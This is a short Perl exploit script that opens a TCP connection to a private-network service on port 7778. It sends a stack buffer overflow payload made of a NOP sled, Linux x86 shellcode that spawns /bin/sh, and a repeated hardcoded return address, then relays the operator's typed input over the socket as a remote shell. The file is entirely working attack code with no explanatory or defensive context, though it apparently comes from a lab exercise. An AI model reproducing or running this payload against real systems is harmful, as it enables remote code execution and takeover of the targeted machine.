#!/usr/bin/perl
#tcpclient.pl

use IO::Socket;

$socket = new IO::Socket::INET (
                                  PeerAddr  => '10.10.10.12',
                                  PeerPort  =>  7778,
                                  Proto => 'tcp',
                               )                
or die "Couldn't connect to Server\n";

my $noops= "\x90" x 16; #16 noops

my $shellCodeBase=
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
  "\x80\xe8\xdc\xff\xff\xff/bin/sh" .
  "\x90\x90\x90"; # extended to 3*16 bytes

my $returnAddress = "\xe0\xf8\xff\xbf";

my $shellCode= ($noops x 57) . ($shellCodeBase) . ($noops x 4) . ($returnAddress x 4);
#57 lines of noops
#3 lines of shell code
#4 lines of noops
#1 line of return address
#65
my $i = 0;
while (1) {
	
    $socket->recv($recv_data,1024);
	    print "RECIEVED: $recv_data"; 
            print "\nSEND(TYPE quit to Quit):";
        
        if ($i == 0){
                $send_data=$shellCode . "\n";
                $i = $i + 1;
        }else{
                $send_data = <STDIN>;
        }
        $tmp=$send_data;
	chop($tmp); # get rid of new line     
        
        if ($tmp ne 'quit') {
	        $socket->send($send_data);
        }    else {
	        $socket->send($send_data);
            	close $socket;
            	last;
        }
}    
    
